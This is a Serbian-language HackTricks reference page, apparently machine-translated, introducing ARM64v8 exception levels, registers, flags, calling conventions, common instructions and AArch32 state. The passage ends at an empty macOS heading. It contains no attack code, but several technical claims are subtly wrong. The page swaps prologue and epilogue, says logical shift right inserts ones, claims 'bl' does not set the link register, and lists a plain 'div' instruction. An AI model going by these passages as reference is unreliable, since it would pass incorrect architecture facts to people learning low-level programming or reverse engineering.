# Uvod u ARM64v8

{% hint style="success" %}
Naučite i vežbajte hakovanje AWS-a:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Naučite i vežbajte hakovanje GCP-a: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## **Nivoi izuzetaka - EL (ARM64v8)**

U ARMv8 arhitekturi, nivoi izvršenja, poznati kao Nivoi izuzetaka (ELs), definišu nivo privilegija i mogućnosti izvršnog okruženja. Postoje četiri nivoa izuzetaka, od EL0 do EL3, pri čemu svaki služi različitoj svrsi:

1. **EL0 - Korisnički režim**:
* Ovo je nivo sa najmanje privilegija i koristi se za izvršavanje redovnog aplikativnog koda.
* Aplikacije koje se izvršavaju na EL0 su izolovane jedna od druge i od sistemskog softvera, što poboljšava bezbednost i stabilnost.
2. **EL1 - Režim jezgra operativnog sistema**:
* Većina jezgara operativnih sistema radi na ovom nivou.
* EL1 ima više privilegija od EL0 i može pristupiti sistemskim resursima, ali uz određena ograničenja radi očuvanja integriteta sistema.
3. **EL2 - Režim hipervizora**:
* Ovaj nivo se koristi za virtualizaciju. Hipervizor koji radi na EL2 može upravljati sa više operativnih sistema (svaki u svom EL1) koji se izvršavaju na istom fizičkom hardveru.
* EL2 pruža funkcije za izolaciju i kontrolu virtualizovanih okruženja.
4. **EL3 - Režim sigurnosnog monitora**:
* Ovo je najprivilegovaniji nivo i često se koristi za sigurno podizanje sistema i poverljiva izvršna okruženja.
* EL3 može upravljati i kontrolisati pristupe između sigurnih i nesigurnih stanja (kao što su sigurno podizanje, poverljivi OS, itd.).

Korišćenje ovih nivoa omogućava struktuiran i siguran način upravljanja različitim aspektima sistema, od korisničkih aplikacija do najprivilegovanijeg sistemskog softvera. Pristup ARMv8 privilegijama pomaže u efikasnoj izolaciji različitih komponenti sistema, čime se poboljšava bezbednost i pouzdanost sistema.

## **Registri (ARM64v8)**

ARM64 ima **31 registar opšte namene**, označenih kao `x0` do `x30`. Svaki može čuvati vrednost od **64 bita** (8 bajtova). Za operacije koje zahtevaju samo vrednosti od 32 bita, isti registri mogu se pristupiti u režimu od 32 bita koristeći imena w0 do w30.

1. **`x0`** do **`x7`** - Ovi se obično koriste kao registri za prolazak i prosleđivanje parametara podrutinama.
* **`x0`** takođe nosi povratne podatke funkcije.
2. **`x8`** - U Linux jezgru, `x8` se koristi kao broj sistema poziva za `svc` instrukciju. **Na macOS-u se koristi x16!**
3. **`x9`** do **`x15`** - Dodatni privremeni registri, često korišćeni za lokalne promenljive.
4. **`x16`** i **`x17`** - **Registri poziva unutar procedure**. Privremeni registri za neposredne vrednosti. Koriste se i za indirektne pozive funkcija i PLT (Procedure Linkage Table) stubove.
* **`x16`** se koristi kao **broj sistema poziva** za **`svc`** instrukciju na **macOS-u**.
5. **`x18`** - **Registar platforme**. Može se koristiti kao registar opšte namene, ali na nekim platformama, ovaj registar je rezervisan za specifične potrebe platforme: Pokazivač na trenutni blok okruženja niti u Windows-u, ili pokazivač na trenutno **izvršnu strukturu zadatka u jezgru Linux-a**.
6. **`x19`** do **`x28`** - Ovo su registri sačuvani za pozvane funkcije. Funkcija mora sačuvati vrednosti ovih registara za svog pozivaoca, pa se čuvaju na steku i vraćaju pre povratka pozivaocu.
7. **`x29`** - **Pokazivač okvira** za praćenje okvira steka. Kada se kreira novi okvir steka jer je funkcija pozvana, **`x29`** registar se **čuva na steku** i nova adresa okvira (**adresa `sp`**) se **čuva u ovom registru**.
* Ovaj registar takođe može se koristiti kao **registar opšte namene**, iako se obično koristi kao referenca na **lokalne promenljive**.
8. **`x30`** ili **`lr`**- **Registar linka**. Čuva **adresu povratka** kada se izvrši `BL` (Branch with Link) ili `BLR` (Branch with Link to Register) instrukcija čuvajući vrednost **`pc`** u ovom registru.
* Može se koristiti kao i svaki drugi registar.
* Ako trenutna funkcija namerava pozvati novu funkciju i time prepisati `lr`, čuvaće je na steku na početku, ovo je epilog (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Čuvanje `fp` i `lr`, generisanje prostora i dobijanje novog `fp`) i vraćaće je na kraju, ovo je prolog (`ldp x29, x30, [sp], #48; ret` -> Vraćanje `fp` i `lr` i povratak).
9. **`sp`** - **Pokazivač steka**, koristi se za praćenje vrha steka.
* Vrednost **`sp`** uvek treba da bude sačuvana na bar **quadword** **poravnanju** ili može doći do greške poravnanja.
10. **`pc`** - **Brojač programa**, koji pokazuje na sledeću instrukciju. Ovaj registar se može ažurirati samo putem generisanja izuzetaka, povratka izuzetaka i skokova. Jedine obične instrukcije koje mogu čitati ovaj registar su instrukcije skoka sa linkom (BL, BLR) za čuvanje adrese **`pc`** u **`lr`** (Registar linka).
11. **`xzr`** - **Registar nula**. Takođe nazvan **`wzr`** u svom obliku registra od **32** bita. Može se koristiti za lako dobijanje nule (uobičajena operacija) ili za obavljanje poređenja koristeći **`subs`** kao **`subs XZR, Xn, #10`** čuvajući rezultujuće podatke nigde (u **`xzr`**).

Registri **`Wn`** su **32bit** verzija registra **`Xn`**.

### SIMD i Registri za plutanje sa pokretnim zarezom

Pored toga, postoje još **32 registra dužine od 128 bita** koji se mogu koristiti u optimizovanim operacijama jedne instrukcije sa više podataka (SIMD) i za obavljanje aritmetike sa pokretnim zarezom. Oni se nazivaju Vn registri iako mogu raditi i u **64**-bitnom, **32**-bitnom, **16**-bitnom i **8**-bitnom režimu, tada se nazivaju **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** i **`Bn`**.
### Registri sistema

**Postoje stotine sistema registara**, takođe nazvanih registri specijalne namene (SPR), koji se koriste za **praćenje** i **kontrolu** **ponašanja procesora**.\
Mogu se samo čitati ili postavljati korišćenjem posvećene specijalne instrukcije **`mrs`** i **`msr`**.

Specijalni registri **`TPIDR_EL0`** i **`TPIDDR_EL0`** često se nalaze prilikom reverznog inženjeringa. Sufiks `EL0` označava **minimalni izuzetak** iz kojeg se registar može pristupiti (u ovom slučaju EL0 je redovni nivo izuzetka (privilegija) sa kojim se izvršavaju redovni programi).\
Često se koriste za čuvanje **bazne adrese regiona memorije za lokalno skladištenje niti**. Obično je prvi čitljiv i zapisiv za programe koji se izvršavaju u EL0, ali drugi se može čitati iz EL0 i pisati iz EL1 (kao kernel).

* `mrs x0, TPIDR_EL0 ; Čitanje TPIDR_EL0 u x0`
* `msr TPIDR_EL0, X0 ; Pisanje x0 u TPIDR_EL0`

### **PSTATE**

**PSTATE** sadrži nekoliko procesnih komponenti serijalizovanih u operativnom sistemu vidljiv **`SPSR_ELx`** specijalni registar, gde je X **nivo dozvole izazvanog** izuzetka (ovo omogućava vraćanje stanja procesa kada izuzetak završi).\
Ovo su pristupačna polja:

<figure><img src="../../../.gitbook/assets/image (1196).png" alt=""><figcaption></figcaption></figure>

* Zastave uslova **`N`**, **`Z`**, **`C`** i **`V`**:
* **`N`** znači da je operacija dala negativan rezultat
* **`Z`** znači da je operacija dala nulu
* **`C`** znači da je operacija izvršena
* **`V`** znači da je operacija dala prekoračenje sa znakom:
* Zbir dva pozitivna broja daje negativan rezultat.
* Zbir dva negativna broja daje pozitivan rezultat.
* Pri oduzimanju, kada se od manjeg pozitivnog broja oduzme veći negativni broj (ili obrnuto), i rezultat ne može biti predstavljen unutar opsega datog veličinom bita.
* Očigledno je da procesor ne zna da li je operacija sa znakom ili ne, pa će proveriti C i V u operacijama i ukazati na prenos ako se dogodio u slučaju da je bio sa znakom ili bez znaka.

{% hint style="warning" %}
Nisu sve instrukcije ažuriraju ove zastave. Neke poput **`CMP`** ili **`TST`** to rade, a druge koje imaju sufiks s poput **`ADDS`** takođe to rade.
{% endhint %}

* Trenutna zastava **širine registra (`nRW`)**: Ako zastava ima vrednost 0, program će se izvršavati u AArch64 stanju izvršenja nakon nastavka.
* Trenutni **nivo izuzetka** (**`EL`**): Redovan program koji se izvršava u EL0 imaće vrednost 0
* Zastava za **jedan korak** (**`SS`**): Koristi se od strane debagera za jednokorakno izvršavanje postavljanjem SS zastave na 1 unutar **`SPSR_ELx`** putem izuzetka. Program će izvršiti korak i izdati izuzetak jednog koraka.
* Zastava za **nevažeći izuzetak** (**`IL`**): Koristi se za označavanje kada privilegovani softver izvrši nevažeći prenos nivoa izuzetka, ova zastava se postavlja na 1 i procesor pokreće izuzetak nevažećeg stanja.
* Zastave **`DAIF`**: Ove zastave omogućavaju privilegovanom programu selektivno maskiranje određenih spoljnih izuzetaka.
* Ako je **`A`** 1 to znači da će biti pokrenuti **asinhroni prekidi**. **`I`** konfiguriše odgovor na spoljne hardverske **zahteve za prekidima** (IRQ), a F je povezano sa **brzim zahtevima za prekidima** (FIR).
* Zastave za **izbor pokazivača steka (`SPS`)**: Privilegovani programi koji se izvršavaju u EL1 i više mogu da prebacuju između korišćenja svog registra pokazivača steka i korisničkog modela (npr. između `SP_EL1` i `EL0`). Ovo prebacivanje se vrši upisivanjem u specijalni registar **`SPSel`**. Ovo se ne može uraditi iz EL0.

## **Konvencija pozivanja (ARM64v8)**

ARM64 konvencija pozivanja specificira da se **prva osam parametara** funkcije prosleđuju u registre **`x0` do `x7`**. **Dodatni** parametri se prosleđuju na **steku**. Povratna vrednost se vraća u registru **`x0`**, ili u **`x1`** takođe **ako je duža od 128 bita**. Registri **`x19`** do **`x30`** i **`sp`** moraju biti **sačuvani** prilikom poziva funkcije.

Prilikom čitanja funkcije u sklopu, potražite **prolog funkcije i epilog**. **Prolog** obično uključuje **čuvanje pokazivača okvira (`x29`)**, **postavljanje** novog **pokazivača okvira**, i **dodeljivanje prostora steka**. **Epilog** obično uključuje **vraćanje sačuvanog pokazivača okvira** i **izlazak** iz funkcije.

### Konvencija pozivanja u Swift-u

Swift ima svoju **konvenciju pozivanja** koja se može pronaći na [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Uobičajene instrukcije (ARM64v8)**

ARM64 instrukcije generalno imaju **format `opcode dst, src1, src2`**, gde je **`opcode`** operacija koja treba da se izvrši (kao što su `add`, `sub`, `mov`, itd.), **`dst`** je **odredišni** registar gde će rezultat biti smešten, a **`src1`** i **`src2`** su **izvorni** registri. Neposredne vrednosti takođe mogu biti korišćene umesto izvornih registara.

* **`mov`**: **Premeštanje** vrednosti iz jednog **registra** u drugi.
* Primer: `mov x0, x1` — Ovo premešta vrednost iz `x1` u `x0`.
* **`ldr`**: **Učitavanje** vrednosti iz **memorije** u **registar**.
* Primer: `ldr x0, [x1]` — Ovo učitava vrednost sa lokacije memorije na koju pokazuje `x1` u `x0`.
* **Mod sa pomerajem**: Pomeraj koji utiče na pokazivač je naznačen, na primer:
* `ldr x2, [x1, #8]`, ovo će učitati u x2 vrednost iz x1 + 8
* `ldr x2, [x0, x1, lsl #2]`, ovo će učitati u x2 objekat iz niza x0, sa pozicije x1 (indeks) \* 4
* **Mod pre indeksa**: Ovo će primeniti izračunavanja na početni, dobiti rezultat i takođe sačuvati novi početak u početku.
* `ldr x2, [x1, #8]!`, ovo će učitati `x1 + 8` u `x2` i sačuvati u x1 rezultat `x1 + 8`
* `str lr, [sp, #-4]!`, Sačuvajte registar linka u sp i ažurirajte registar sp
* **Mod posle indeksa**: Slično prethodnom, ali se pristupa memoriji, a zatim se izračunava i čuva pomeraj.
* `ldr x0, [x1], #8`, učitaj `x1` u `x0` i ažuriraj x1 sa `x1 + 8`
* **Adresa relativna prema PC registru**: U ovom slučaju adresa za učitavanje se računa relativno prema PC registru
* `ldr x1, =_start`, Ovo će učitati adresu gde počinje simbol `_start` u x1 u odnosu na trenutni PC.
* **`str`**: **Čuvanje** vrednosti iz **registra** u **memoriju**.
* Primer: `str x0, [x1]` — Ovo čuva vrednost iz `x0` na lokaciji memorije na koju pokazuje `x1`.
* **`ldp`**: **Učitavanje para registara**. Ova instrukcija **učitava dva registra** iz **uzastopnih lokacija memorije**. Adresa memorije se obično formira dodavanjem pomeraja vrednosti u drugom registru.
* Primer: `ldp x0, x1, [x2]` — Ovo učitava `x0` i `x1` sa lokacija memorije na `x2` i `x2 + 8`, redom.
* **`stp`**: **Čuvanje para registara**. Ova instrukcija **čuva dva registra** na **uzastopnim lokacijama memorije**. Adresa memorije se obično formira dodavanjem pomeraja vrednosti u drugom registru.
* Primer: `stp x0, x1, [sp]` — Ovo čuva `x0` i `x1` na lokacijama memorije na `sp` i `sp + 8`, redom.
* `stp x0, x1, [sp, #16]!` — Ovo čuva `x0` i `x1` na lokacijama memorije na `sp+16` i `sp + 24`, redom, i ažurira `sp` sa `sp+16`.
* **`add`**: **Sabiranje** vrednosti dva registra i smeštanje rezultata u registar.
* Sintaksa: add(s) Xn1, Xn2, Xn3 | #imm, \[pomeraj #N | RRX\]
* Xn1 -> Destinacija
* Xn2 -> Operand 1
* Xn3 | #imm -> Operand 2 (registar ili neposredno)
* \[pomeraj #N | RRX\] -> Izvrši pomeraj ili pozovi RRX
* Primer: `add x0, x1, x2` — Ovo sabira vrednosti u `x1` i `x2` i čuva rezultat u `x0`.
* `add x5, x5, #1, lsl #12` — Ovo je jednako 4096 (jedinica pomerena 12 puta) -> 1 0000 0000 0000 0000
* **`adds`** Ovo vrši `add` i ažurira zastave
* **`sub`**: **Oduzmi** vrednosti dva registra i čuvaj rezultat u registru.
* Proveri **sintaksu za `add`**.
* Primer: `sub x0, x1, x2` — Ovo oduzima vrednost u `x2` od `x1` i čuva rezultat u `x0`.
* **`subs`** Ovo je kao sub ali ažurira zastavu
* **`mul`**: **Množi** vrednosti **dva registra** i čuva rezultat u registru.
* Primer: `mul x0, x1, x2` — Ovo množi vrednosti u `x1` i `x2` i čuva rezultat u `x0`.
* **`div`**: **Deljenje** vrednosti jednog registra sa drugim i čuva rezultat u registru.
* Primer: `div x0, x1, x2` — Ovo deli vrednost u `x1` sa `x2` i čuva rezultat u `x0`.
* **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
* **Logički pomeraj levo**: Dodaj 0 sa kraja pomerajući ostale bitove unapred (množi sa n puta 2)
* **Logički pomeraj desno**: Dodaj 1 na početak pomerajući ostale bitove unazad (deli sa n puta 2 kod nepotpisanog)
* **Aritmetički pomeraj desno**: Kao **`lsr`**, ali umesto dodavanja 0 ako je najznačajniji bit 1, \*\*dodaju se 1 (\*\*deli sa n puta 2 kod potpisanog)
* **Rotacija udesno**: Kao **`lsr`** ali šta god je uklonjeno sa desne strane se dodaje na levo
* **Rotacija udesno sa proširenjem**: Kao **`ror`**, ali sa zastavicom prenosa kao "najznačajnijim bitom". Tako da se zastavica prenosa pomera na bit 31 i uklonjeni bit na zastavicu.
* **`bfm`**: **Pomeraj bitova**, ove operacije **kopiraju bitove `0...n`** iz vrednosti i smeštaju ih na pozicije **`m..m+n`**. **`#s`** određuje **najlevlji bit** poziciju i **`#r`** broj **rotacija udesno**.
* Pomeraj bitova: `BFM Xd, Xn, #r`
* Potpisani pomeraj bitova: `SBFM Xd, Xn, #r, #s`
* Nepotpisani pomeraj bitova: `UBFM Xd, Xn, #r, #s`
* **Ekstrakcija i umetanje bitova:** Kopira bitovno polje iz registra i kopira ga u drugi registar.
* **`BFI X1, X2, #3, #4`** Umetni 4 bita iz X2 od 3. bita X1
* **`BFXIL X1, X2, #3, #4`** Ekstraktuj četiri bita od 3. bita X2 i kopiraj ih u X1
* **`SBFIZ X1, X2, #3, #4`** Proširi znak 4 bita iz X2 i umetni ih u X1 počevši od bita 3, nulirajući desne bitove
* **`SBFX X1, X2, #3, #4`** Ekstraktuje 4 bita počevši od bita 3 iz X2, proširuje znak i smešta rezultat u X1
* **`UBFIZ X1, X2, #3, #4`** Proširuje nulama 4 bita iz X2 i umetni ih u X1 počevši od bita 3, nulirajući desne bitove
* **`UBFX X1, X2, #3, #4`** Ekstraktuje 4 bita počevši od bita 3 iz X2 i smešta nulirani rezultat u X1.
* **Proširi znak na X:** Proširuje znak (ili dodaje samo 0 u nepotpisanom obliku) vrednosti kako bi se mogle izvršiti operacije sa njom:
* **`SXTB X1, W2`** Proširuje znak bajta **iz W2 u X1** (`W2` je polovina `X2`) da popuni 64 bita
* **`SXTH X1, W2`** Proširuje znak 16-bitnog broja **iz W2 u X1** da popuni 64 bita
* **`SXTW X1, W2`** Proširuje znak bajta **iz W2 u X1** da popuni 64 bita
* **`UXTB X1, W2`** Dodaje 0 (nepotpisano) bajtu **iz W2 u X1** da popuni 64 bita
* **`extr`:** Ekstraktuje bitove iz određenog **para registara konkateniranih**.
* Primer: `EXTR W3, W2, W1, #3` Ovo će **konkatenirati W1+W2** i uzeti **od bita 3 iz W2 do bita 3 iz W1** i smestiti u W3.
* **`cmp`**: **Uporedi** dva registra i postavi uslovne zastave. To je **alias za `subs`** postavljajući destinacioni registar na nulu. Korisno za proveru da li je `m == n`.
* Podržava **istu sintaksu kao `subs`**
* Primer: `cmp x0, x1` — Ovo upoređuje vrednosti u `x0` i `x1` i postavlja uslovne zastave prema tome.
* **`cmn`**: **Uporedi negativno** operand. U ovom slučaju je to **alias za `adds`** i podržava istu sintaksu. Korisno za proveru da li je `m == -n`.
* **`ccmp`**: Uslovno upoređivanje, upoređivanje koje će se izvršiti samo ako je prethodno upoređivanje bilo tačno i posebno će postaviti nzcv bitove.
* `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> ako x1 != x2 i x3 < x4, skoči na funkciju
* To je zato što će se **`ccmp`** izvršiti samo ako je **prethodni `cmp` bio `NE`**, ako nije bitovi `nzcv` će biti postavljeni na 0 (što neće zadovoljiti `blt` upoređivanje).
* Ovo takođe može biti korišćeno kao `ccmn` (isto ali negativno, kao `cmp` vs `cmn`).
* **`tst`**: Proverava da li su vrednosti upoređivanja oba 1 (radi kao i ANDS bez smeštanja rezultata bilo gde). Korisno je proveriti registar sa vrednošću i proveriti da li su bilo koji bitovi registra naznačeni u vrednosti 1.
* Primer: `tst X1, #7` Proveri da li su bilo koji od poslednja 3 bita X1 1
* **`teq`**: XOR operacija odbacivanjem rezultata
* **`b`**: Bezuslovni skok
* Primer: `b mojaFunkcija`
* Imajte na umu da ovo neće popuniti registar linka sa povratnom adresom (nije pogodno za pozive potprograma koji treba da se vrate nazad)
* **`bl`**: **Skok** sa linkom, koristi se za **poziv** potprograma. Čuva **povratnu adresu u `x30`**.
* Primer: `bl mojaFunkcija` — Ovo poziva funkciju `mojaFunkcija` i čuva povratnu adresu u `x30`.
* Imajte na umu da ovo neće popuniti registar linka sa povratnom adresom (nije pogodno za pozive potprograma koji treba da se vrate nazad)
* **`blr`**: **Skok** sa Linkom u Registar, koristi se za **poziv** potprograma gde je cilj **specifikovan** u registru. Čuva povratnu adresu u `x30`. (Ovo je
* Primer: `blr x1` — Ovo poziva funkciju čija je adresa sadržana u `x1` i čuva povratnu adresu u `x30`.
* **`ret`**: **Povratak** iz **potprograma**, obično koristeći adresu u **`x30`**.
* Primer: `ret` — Ovo se vraća iz trenutnog potprograma koristeći povratnu adresu u `x30`.
* **`b.<uslov>`**: Uslovni skokovi
* **`b.eq`**: **Skok ako je jednako**, zasnovan na prethodnoj `cmp` instrukciji.
* Primer: `b.eq oznaka` — Ako je prethodna `cmp` instrukcija pronašla dve jednake vrednosti, skoči na `oznaka`.
* **`b.ne`**: **Skok ako nije jednako**. Ova instrukcija proverava uslovne zastave (koje su postavljene prethodnom instrukcijom poređenja) i ako upoređene vrednosti nisu jednake, preskače do oznake ili adrese.
* Primer: Nakon `cmp x0, x1` instrukcije, `b.ne label` — Ako vrednosti u `x0` i `x1` nisu jednake, preskače do `label`.
* **`cbz`**: **Uporedi i skoči ako je nula**. Ova instrukcija upoređuje registar sa nulom i ako su jednaki, preskače do oznake ili adrese.
* Primer: `cbz x0, label` — Ako je vrednost u `x0` nula, preskače do `label`.
* **`cbnz`**: **Uporedi i skoči ako nije nula**. Ova instrukcija upoređuje registar sa nulom i ako nisu jednaki, preskače do oznake ili adrese.
* Primer: `cbnz x0, label` — Ako je vrednost u `x0` različita od nule, preskače do `label`.
* **`tbnz`**: Testiranje bita i skok ako nije nula
* Primer: `tbnz x0, #8, label`
* **`tbz`**: Testiranje bita i skok ako je nula
* Primer: `tbz x0, #8, label`
* **Operacije uslovnog izbora**: Ovo su operacije čije ponašanje varira u zavisnosti od uslovnih bitova.
* `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Ako je tačno, X0 = X1, ako nije, X0 = X2
* `csinc Xd, Xn, Xm, cond` -> Ako je tačno, Xd = Xn, ako nije, Xd = Xm + 1
* `cinc Xd, Xn, cond` -> Ako je tačno, Xd = Xn + 1, ako nije, Xd = Xn
* `csinv Xd, Xn, Xm, cond` -> Ako je tačno, Xd = Xn, ako nije, Xd = NIJE(Xm)
* `cinv Xd, Xn, cond` -> Ako je tačno, Xd = NIJE(Xn), ako nije, Xd = Xn
* `csneg Xd, Xn, Xm, cond` -> Ako je tačno, Xd = Xn, ako nije, Xd = - Xm
* `cneg Xd, Xn, cond` -> Ako je tačno, Xd = - Xn, ako nije, Xd = Xn
* `cset Xd, Xn, Xm, cond` -> Ako je tačno, Xd = 1, ako nije, Xd = 0
* `csetm Xd, Xn, Xm, cond` -> Ako je tačno, Xd = \<svi 1>, ako nije, Xd = 0
* **`adrp`**: Izračunava **adresu stranice simbola** i smešta je u registar.
* Primer: `adrp x0, symbol` — Ovo izračunava adresu stranice `symbol` i smešta je u `x0`.
* **`ldrsw`**: **Učitava** potpisanu **32-bitnu** vrednost iz memorije i **proširuje je na 64** bita.
* Primer: `ldrsw x0, [x1]` — Ovo učitava potpisanu 32-bitnu vrednost sa lokacije u memoriji na koju pokazuje `x1`, proširuje je na 64 bita i smešta je u `x0`.
* **`stur`**: **Čuva vrednost registra na lokaciji u memoriji**, koristeći pomeraj od drugog registra.
* Primer: `stur x0, [x1, #4]` — Ovo smešta vrednost iz `x0` na adresu u memoriji koja je 4 bajta veća od adrese u `x1`.
* **`svc`** : Pravi **sistemski poziv**. Označava "Supervizorski poziv". Kada procesor izvrši ovu instrukciju, **prelazi iz korisničkog režima u režim jezgra** i skače na određenu lokaciju u memoriji gde se nalazi kod za **obradu sistemskog poziva jezgra**.
*   Primer:

```armasm
mov x8, 93  ; Učitava broj sistema za izlazak (93) u registar x8.
mov x0, 0   ; Učitava kod statusa izlaska (0) u registar x0.
svc 0       ; Pravi sistemski poziv.
```

### **Prolog funkcije**

1. **Sačuvajte registar veze i pokazivač okvira na steku**:

{% code overflow="wrap" %}
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
{% endcode %}

2. **Postavite novi pokazivač okvira**: `mov x29, sp` (postavlja novi pokazivač okvira za trenutnu funkciju)
3. **Alocirajte prostor na steku za lokalne promenljive** (ako je potrebno): `sub sp, sp, <size>` (gde je `<size>` broj bajtova potreban)

### **Epilog funkcije**

1. **Dealocirajte lokalne promenljive (ako su alocirane)**: `add sp, sp, <size>`
2. **Vratite registar veze i pokazivač okvira**:

{% code overflow="wrap" %}
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
{% endcode %}

3. **Povratak**: `ret` (vraća kontrolu pozivaocu koristeći adresu u registru veze)

## Stanje izvršenja AARCH32

Armv8-A podržava izvršenje 32-bitnih programa. **AArch32** može raditi u jednom od **dva skupa instrukcija**: **`A32`** i **`T32`** i može prelaziti između njih putem **`međusobnog rada`**.\
**Privilegovani** 64-bitni programi mogu zakazati **izvršenje 32-bitnih** programa izvršavanjem transfera nivoa izuzetka ka niže privilegovanom 32-bitnom programu.\
Napomena da se prelazak sa 64-bitnog na 32-bitni dešava sa nižim nivoom izuzetka (na primer, 64-bitni program u EL1 pokreće program u EL0). Ovo se postiže postavljanjem **bita 4 od** specijalnog registra **`SPSR_ELx`** na **1** kada je `AArch32` procesna nit spremna za izvršenje, a ostatak `SPSR_ELx` čuva **`AArch32`** programe CPSR. Zatim, privilegovani proces poziva instrukciju **`ERET`** kako bi procesor prešao u **`AArch32`** ulazeći u A32 ili T32 u zavisnosti od CPSR\*\*.\*\*

**`Međusobni rad`** se dešava korišćenjem bitova J i T CPSR-a. `J=0` i `T=0` znači **`A32`** i `J=0` i `T=1` znači **T32**. Ovo se u osnovi prevodi na postavljanje **najnižeg bita na 1** kako bi se naznačilo da je skup instrukcija T32.\
Ovo se postavlja tokom **instrukcija grana međusobnog rada,** ali može biti postavljeno direktno i drugim instrukcijama kada je PC postavljen kao registar odredišta. Primer:

Još jedan primer:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registri

Postoje 16 registara od 32 bita (r0-r15). **Od r0 do r14** mogu se koristiti za **bilo koju operaciju**, međutim neki od njih obično su rezervisani:

- **`r15`**: Brojač programa (uvek). Sadrži adresu sledeće instrukcije. U A32 trenutno + 8, u T32, trenutno + 4.
- **`r11`**: Pokazivač okvira
- **`r12`**: Registar za unutarproceduralne pozive
- **`r13`**: Pokazivač steka
- **`r14`**: Registar za povezivanje

Osim toga, registri se čuvaju u **`bankovnim registrima`**. To su mesta koja čuvaju vrednosti registara omogućavajući **brzo prebacivanje konteksta** u rukovanju izuzecima i privilegovanim operacijama kako bi se izbegla potreba za ručnim čuvanjem i vraćanjem registara svaki put.\
Ovo se postiže **čuvanjem stanja procesora od `CPSR` do `SPSR`** procesorskog moda u koji se preuzima izuzetak. Prilikom povratka iz izuzetka, **`CPSR`** se obnavlja iz **`SPSR`**.

### CPSR - Trenutni registar statusa programa

U AArch32, CPSR radi slično kao **`PSTATE`** u AArch64 i takođe se čuva u **`SPSR_ELx`** kada se preuzme izuzetak radi kasnijeg obnavljanja izvršenja:

<figure><img src="../../../.gitbook/assets/image (1197).png" alt=""><figcaption></figcaption></figure>

Polja su podeljena u neke grupe:

- Registar statusa aplikacije (APSR): Aritmetičke zastavice i pristupačne iz EL0
- Registri stanja izvršenja: Ponašanje procesa (upravljano od strane OS-a).

#### Registar statusa aplikacije (APSR)

- Zastavice **`N`**, **`Z`**, **`C`**, **`V`** (kao i u AArch64)
- Zastava **`Q`**: Postavlja se na 1 kada se **desi zasićenje celobrojnih vrednosti** tokom izvršenja specijalizovane aritmetičke instrukcije. Kada se jednom postavi na **`1`**, zadržava vrednost dok se ručno ne postavi na 0. Osim toga, ne postoji nijedna instrukcija koja implicitno proverava njenu vrednost, već se to mora uraditi čitanjem ručno.
- **`GE`** (Veće ili jednako) zastave: Koriste se u SIMD (Single Instruction, Multiple Data) operacijama, poput "paralelnog sabiranja" i "paralelnog oduzimanja". Ove operacije omogućavaju obradu više podataka u jednoj instrukciji.

Na primer, instrukcija **`UADD8`** **sabira četiri para bajtova** (iz dva 32-bitna operanda) paralelno i čuva rezultate u 32-bitnom registru. Zatim **postavlja `GE` zastave u `APSR`** na osnovu ovih rezultata. Svaka GE zastava odgovara jednom od sabiranja bajtova, ukazujući da li je sabiranje za taj par bajtova **prekoračilo**.

Instrukcija **`SEL`** koristi ove GE zastave za izvođenje uslovnih radnji.

#### Registri stanja izvršenja

- Bitovi **`J`** i **`T`**: **`J`** treba da bude 0, a ako je **`T`** 0 koristi se skup instrukcija A32, a ako je 1, koristi se T32.
- Registar stanja IT bloka (`ITSTATE`): To su bitovi od 10-15 i 25-26. Čuvaju uslove za instrukcije unutar grupe sa prefiksom **`IT`**.
- Bit **`E`**: Označava **endianness**.
- Bitovi moda i maski izuzetka (0-4): Određuju trenutno stanje izvršenja. Peti označava da li program radi kao 32-bitni (1) ili 64-bitni (0). Ostala 4 predstavljaju **trenutni korišćeni režim izuzetka** (kada se desi izuzetak i kada se rukuje njime). Postavljeni broj označava **trenutni prioritet** u slučaju da se desi još jedan izuzetak dok se ovaj rukuje.

<figure><img src="../../../.gitbook/assets/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: Određeni izuzeci mogu biti onemogućeni korišćenjem bitova **`A`**, `I`, `F`. Ako je **`A`** 1, to znači da će biti pokrenuti **asinhroni prekidi**. **`I`** konfiguriše odgovor na spoljne hardverske **zahteve za prekidima** (IRQ). i F je povezan sa **brzim zahtevima za prekidima** (FIR).

## macOS

### BSD sistemski pozivi

Pogledajte [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master). BSD sistemski pozivi će imati **x16 > 0**.

### Mach zamke

